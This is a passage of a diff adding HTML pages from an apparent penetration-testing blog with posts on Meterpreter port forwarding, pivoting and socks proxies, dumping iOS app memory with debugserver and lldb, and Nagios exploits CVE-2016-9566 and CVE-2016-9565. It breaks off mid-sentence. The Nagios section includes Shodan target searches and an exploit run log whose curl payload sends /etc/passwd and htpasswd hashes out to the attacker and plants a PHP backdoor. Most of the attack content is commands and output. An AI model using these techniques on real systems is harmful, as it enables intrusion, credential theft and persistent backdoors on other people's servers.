@@ -263,6 +263,1102 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/02/Meterpreter-Proxy-and-Route/" itemprop="url">
+                  Meterpreter Proxy and Route
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-02T00:49:27+08:00">
+                2017-01-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-portfwd"><a href="#0x01-portfwd" class="headerlink" title="0x01 portfwd"></a>0x01 portfwd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.0.105 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.0.105:3389</span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote              Direction</span><br><span class="line">   -----  -----         ------              ---------</span><br><span class="line">   1      0.0.0.0:1234  192.168.0.105:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line">&gt; rdesktop 127.1.1.0:1234</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-pivot"><a href="#0x02-pivot" class="headerlink" title="0x02 pivot"></a>0x02 pivot</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(web_delivery) &gt; route add 192.168.0.0 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(web_delivery) &gt; route</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.0.0        255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">msf exploit(web_delivery) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Type                    Information              Connection</span><br><span class="line">  --  ----                    -----------              ----------</span><br><span class="line">  1   meterpreter python/osx  xl7dev  192.168.0.105:4444 -&gt; 192.168.0.105:50834 (192.168.0.105)</span><br><span class="line">msf exploit(web_delivery) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line">msf auxiliary(socks4a) &gt; exploit -y</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">&gt; vi /etc/proxychains.conf</span><br><span class="line">socks4  127.0.0.1 1080</span><br><span class="line">&gt; proxychains4 nmap -sT -Pn 192.168.0.100</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-autoroute"><a href="#0x03-autoroute" class="headerlink" title="0x03 autoroute"></a>0x03 autoroute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/windows/manage/autoroute module</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.0.1/24</span><br><span class="line">[*] Adding a route to 192.168.0.1/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.0.1/255.255.255.0 via 192.168.0.105</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf auxiliary(web_delivery) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-Multilayer-Proxy"><a href="#0x04-Multilayer-Proxy" class="headerlink" title="0x04 Multilayer Proxy"></a>0x04 Multilayer Proxy</h3><p>attacker-&gt;target1-&gt;target2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; route add 192.168.0.105 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf auxiliary(web_delivery) &gt; route print</span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.0.105      255.255.255.255    Session 1</span><br><span class="line">msf auxiliary(web_delivery) &gt; set LHOST 192.168.0.105</span><br><span class="line">RHOST =&gt; 192.168.0.105</span><br><span class="line">msf exploit(web_delivery) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8089             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.68.0.105     yes       The listen address</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">msf auxiliary(web_delivery) &gt; run</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/28/Dumping-Memory-on-iOS/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/28/Dumping-Memory-on-iOS/" itemprop="url">
+                  Dumping Memory on iOS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-28T13:02:59+08:00">
+                2016-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Tools"><a href="#0x01-Tools" class="headerlink" title="0x01 Tools"></a>0x01 Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LLDB (http://lldb.llvm.org/)</span><br><span class="line">Debugserver</span><br><span class="line">Tcprelay.py ([https://github.com/xl7dev/SecTools/tree/master/iOSTool])</span><br></pre></td></tr></table></figure>
+<h4 id="Setting-Debugserver"><a href="#Setting-Debugserver" class="headerlink" title="Setting Debugserver"></a>Setting Debugserver</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. via usb to connect mobile and MacOS</span><br><span class="line">2. open xcode&gt;&gt;Window&gt;&gt;Devices</span><br><span class="line">3. scp root@iOSIP:/Developer/usr/bin/debugserver ~/debugserver</span><br><span class="line">4. lipo -thin arm64 ~/debugserver -output ~/debugserver</span><br><span class="line"></span><br><span class="line">armv6设备： iPhone, iPhone2, iPhone3G, 第一代、第二代 iPod Touch</span><br><span class="line"></span><br><span class="line">armv7设备：iPhone3GS iPhone4,iPhone4S iPad, iPad2, iPad3(The New iPad), iPad mini iPod Touch 3G, iPod Touch4</span><br><span class="line"></span><br><span class="line">armv7s设备：iPhone5,iPhone5C, iPad4(iPad with Retina Display)</span><br><span class="line"></span><br><span class="line">arm64设备：iPhone5S, iPad Air, iPad mini2(iPad mini with Retina Display)</span><br><span class="line"></span><br><span class="line">5. wget http://7xibfi.com1.z0.glb.clouddn.com/uploads/default/668/c134605bb19a433f.xml -O ent.xml</span><br><span class="line"></span><br><span class="line">6. ldid -Sent.xml debugserver</span><br><span class="line">7. scp debugserver root@iOSIP:/usr/bin/debugserver</span><br><span class="line">8. ssh root@iOSIP</span><br><span class="line">9. chmod +x debugserver</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-Debugserver-attack-pid"><a href="#0x02-Debugserver-attack-pid" class="headerlink" title="0x02 Debugserver attack pid"></a>0x02 Debugserver attack pid</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt; python tcprelay.py -t 22:2222 1234:1234</span><br><span class="line">Forwarding local port 2222 to remote port 22</span><br><span class="line">Forwarding local port 1234 to remote port 1234</span><br><span class="line">Incoming connection to 2222</span><br><span class="line">Waiting for devices...</span><br><span class="line">Connecting to device &lt;MuxDevice: ID 17 ProdID 0x12a8 Serial &apos;0ea150b00ba3deeacb42f399492b7990416a0c87&apos; Location 0x14120000&gt;</span><br><span class="line">Connection established, relaying data</span><br><span class="line">Incoming connection to 1234</span><br><span class="line">Waiting for devices...</span><br><span class="line">Connecting to device &lt;MuxDevice: ID 17 ProdID 0x12a8 Serial &apos;0ea150b00ba3deeacb42f399492b7990416a0c87&apos; Location 0x14120000&gt;</span><br><span class="line">Connection established, relaying data</span><br><span class="line">&gt; ssh root@127.0.0.1 -p 2222</span><br><span class="line">IPhone5S:~ root# ./debugserver *:1234 -a appname</span><br><span class="line">&gt; lldb</span><br><span class="line">(lldb) process connect connect://127.0.0.1:1234</span><br><span class="line">(lldb) image dump sections appname</span><br><span class="line"></span><br><span class="line">Sections for &apos;/private/var/mobile/Containers/Bundle/Application/F3CFF345-71FC-47C4-B1FB-3DAC523C7627/appname.app/appname(0x0000000000047000)&apos; (armv7):</span><br><span class="line"> SectID     Type    Load Address   File Off     File Size   Flags      Section Name</span><br><span class="line"> ------ ---------------- --------------------------------------- ---------- ---------- ---------- ----------------------------</span><br><span class="line"> 0x00000100 container   [0x0000000000000000-0x0000000000004000)* 0x00000000 0x00000000 0x00000000 appname.__PAGEZERO</span><br><span class="line"> 0x00000200 container   [0x0000000000047000-0x00000000001af000) 0x00000000 0x00168000 0x00000000 appname.__TEXT</span><br><span class="line"> 0x00000001 code    [0x000000000004e6e8-0x000000000016d794) 0x000076e8 0x0011f0ac 0x80000400 appname.__TEXT.__text</span><br><span class="line"> 0x00000002 code    [0x000000000016d794-0x000000000016e5e0) 0x00126794 0x00000e4c 0x80000400 appname.__TEXT.__stub_helper</span><br><span class="line"> 0x00000003 data-cstr   [0x000000000016e5e0-0x0000000000189067) 0x001275e0 0x0001aa87 0x00000002 appname.__TEXT.__cstring</span><br><span class="line"> 0x00000004 data-cstr   [0x0000000000189067-0x00000000001a5017) 0x00142067 0x0001bfb0 0x00000002 appname.__TEXT.__objc_methname</span><br><span class="line"> 0x00000005 data-cstr   [0x00000000001a5017-0x00000000001a767a) 0x0015e017 0x00002663 0x00000002 appname.__TEXT.__objc_classname</span><br><span class="line"> 0x00000006 data-cstr   [0x00000000001a767a-0x00000000001abe0c)</span><br></pre></td></tr></table></figure>
+<p>###0x03 dump memory<br>example:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000003 data-cstr    [0x000000000016e5e0-0x0000000000189067) 0x001275e0 0x0001aa87 0x00000002 appname.__TEXT.__cstring</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --outfile ~/0x00000003data-cstr 0x000000000016e5e0 0x0000000000189067 –force</span><br></pre></td></tr></table></figure>
+<p>ios7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.netspi.com/ios-tutorial-dumping-the-application-heap-from-memory</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/16/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/16/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566/" itemprop="url">
+                  Nagios Exploit Root PrivEsc CVE-2016-9566
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-16T10:35:37+08:00">
+                2016-12-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-VULNERABILITY"><a href="#0x01-VULNERABILITY" class="headerlink" title="0x01 VULNERABILITY"></a>0x01 VULNERABILITY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nagios Core &lt; 4.2.4 - Root Privilege Escalation</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-POC"><a href="#0x02-POC" class="headerlink" title="0x02 POC"></a>0x02 POC</h3><p><a href="https://gist.github.com/xl7dev/322b0f85dc9f6a06573302c7de4f4249" target="_blank" rel="external">nagios-root-privesc.sh</a></p>
+<h3 id="0x03-Usage"><a href="#0x03-Usage" class="headerlink" title="0x03 Usage"></a>0x03 Usage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-SOLUTION"><a href="#0x04-SOLUTION" class="headerlink" title="0x04 SOLUTION"></a>0x04 SOLUTION</h3><p>Vendor received this advisory in advance and released a security<br>release of Nagios 4.2.4 to address this vulnerability.</p>
+<h3 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/12/14/Nagios-Exploit-Command-Injection-CVE-2016-9565/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/14/Nagios-Exploit-Command-Injection-CVE-2016-9565/" itemprop="url">
+                  Nagios Exploit Command Injection CVE-2016-9565
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-14T17:17:16+08:00">
+                2016-12-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-VULNERABILITY-effect"><a href="#0x01-VULNERABILITY-effect" class="headerlink" title="0x01 VULNERABILITY effect"></a>0x01 VULNERABILITY effect</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Both of the Nagios Core stable branches 3.x and 4.x are affected</span><br><span class="line">Nagios Core &lt; 4.2.2        Curl Command Injection / Code Execution</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-WebSite"><a href="#0x02-WebSite" class="headerlink" title="0x02 WebSite"></a>0x02 WebSite</h3><p><a href="https://www.nagios.org" target="_blank" rel="external">Nagios Core</a></p>
+<h3 id="0x03-Search-Target"><a href="#0x03-Search-Target" class="headerlink" title="0x03 Search Target"></a>0x03 Search Target</h3><p><a href="https://www.zoomeye.org/search?t=host&amp;q=Nagios+Core" target="_blank" rel="external">Zoomeye</a>  Total results: 252</p>
+<p><a href="https://www.shodan.io/search?query=Nagios+Core" target="_blank" rel="external">Shodan</a>    Total results: 36</p>
+<h3 id="0x04-POC"><a href="#0x04-POC" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><p><a href="https://gist.github.com/xl7dev/bf2f2f91ecee6fbe0675fd59492bef20" target="_blank" rel="external">nagios_cmd_injection.py</a></p>
+<p><a href="https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html" target="_blank" rel="external">Video POC</a></p>
+<p><strong>Usage</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">Example exploit run</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">root@xenial:~/nagios-exploit# ./nagios_cmd_injection.py 192.168.57.3</span><br><span class="line"></span><br><span class="line">Nagios Core &lt; 4.2.0 Curl Command Injection PoC Exploit (CVE-2016-9565)</span><br><span class="line">nagios_cmd_injection.py  ver. 1.0</span><br><span class="line"></span><br><span class="line">Discovered &amp; Coded by:</span><br><span class="line"></span><br><span class="line"> Dawid Golunski</span><br><span class="line"> https://legalhackers.com</span><br><span class="line"></span><br><span class="line">[+] Generating SSL certificate for our python HTTPS web server </span><br><span class="line"></span><br><span class="line">[+] Starting the web server on ports 80 &amp; 443 </span><br><span class="line"></span><br><span class="line">[+] Web server ready for connection from Nagios (http://target-svr/nagios/rss-corefeed.php). Time for your dnsspoof magic... ;)</span><br><span class="line"></span><br><span class="line">[+] Received GET request from Nagios server (192.168.57.4) ! Sending redirect to inject our curl payload:</span><br><span class="line"></span><br><span class="line">-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii /usr/local/nagios/share/nagios-backdoor.php</span><br><span class="line"></span><br><span class="line">[+] Success, curl payload injected! Received data back from the Nagios server 192.168.57.4</span><br><span class="line"></span><br><span class="line">[*] Contents of /etc/passwd file from the target:</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">nagios:x:1001:1001::/home/nagios:/bin/sh</span><br><span class="line">[..cut..]</span><br><span class="line"></span><br><span class="line">[*] Contents of /usr/local/nagios/etc/htpasswd.users file:</span><br><span class="line"></span><br><span class="line">nagiosadmin:$apr1$buzCfFb$GjV/ga6PHp53qePf0</span><br><span class="line"></span><br><span class="line">[*] Retrieved nagios group line from /etc/group file on the target: nagios:x:1001:www-data</span><br><span class="line"></span><br><span class="line">[+] Happy days, &apos;www-data&apos; user belongs to &apos;nagios&apos; group! (meaning writable webroot)</span><br><span class="line"></span><br><span class="line">[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :) </span><br><span class="line"></span><br><span class="line">[+] PHP backdoor should have been saved in /usr/local/nagios/share/nagios-backdoor.php on the target by 